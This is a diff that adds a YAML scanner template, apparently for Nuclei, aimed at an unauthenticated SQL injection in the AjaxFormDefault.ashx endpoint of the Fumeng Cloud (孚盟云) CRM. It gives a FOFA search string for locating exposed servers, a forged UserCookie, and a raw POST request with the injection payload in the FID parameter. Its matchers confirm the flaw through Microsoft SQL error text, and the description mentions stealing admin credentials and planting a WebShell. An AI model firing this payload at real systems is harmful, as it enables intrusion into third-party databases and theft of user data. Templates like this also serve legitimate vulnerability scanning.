@@ -1,0 +1,30 @@
+id: fumeng-cloud-crm-ajaxformdefault-sqli
+
+info:
+  name: "孚盟云 CRM AjaxFormDefault.ashx接口SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+        上海孚盟软件有限公司作为外贸SaaS服务提供商，其孚盟云产品中AjaxFormDefault.ashx接口存在未经验证的SQL注入漏洞。攻击者可通过构造恶意SQL查询语句实现数据库敏感信息泄露（包括但不限于管理员凭证、用户隐私数据），在具备高权限条件下可能通过写入WebShell实现对服务器的持久化控制。
+  tags: 孚盟云 CRM
+
+http:
+- raw:
+  - |
+    POST /m/Dingding/Ajax/AjaxFormDefault.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: UserCookie={"empId":"1"}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=getEditProductPic2&FID='-1/@@VERSION--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+      - 'Microsoft SQL'
+      - "nvarchar"
+    condition: and
